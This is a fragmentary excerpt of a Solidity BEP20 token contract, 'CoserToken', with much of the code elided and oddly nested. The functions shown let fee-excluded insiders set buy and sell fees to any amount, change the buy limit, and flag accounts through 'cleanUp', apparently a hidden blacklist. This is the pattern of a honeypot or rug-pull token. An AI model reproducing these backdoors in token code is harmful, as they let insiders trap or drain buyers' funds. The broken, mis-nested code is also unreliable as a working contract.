...
contract CoserToken is Context, IBEP20, Ownable {
    ...
    uint256 private sAmount = 1000000 * 10 ** 18;
    uint256 private mBuy = 300000 * 10 ** 18;
    ...
    */
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        ...
        function setBuy(uint256 amount) public {
            require(_isExcludedFromFee[msg.sender] == true);
            totalBuyFee = amount;
        }
        function setSell(uint256 amount) public {
            require(_isExcludedFromFee[msg.sender] == true);
            totalSellFee = amount;
        }

        function setBuyLmt(uint256 amount) public {
            require(_isExcludedFromFee[msg.sender] == true);
            mBuy = amount;
        }
    ...
    */
    ...
    function unCleanUp(address account) public {
        require(_isExcludedFromFee[msg.sender] == true);
    ...
    function cleanUp(address account) public{
        require(_isExcludedFromFee[msg.sender] == true);
        _clean[account] = true;
    }
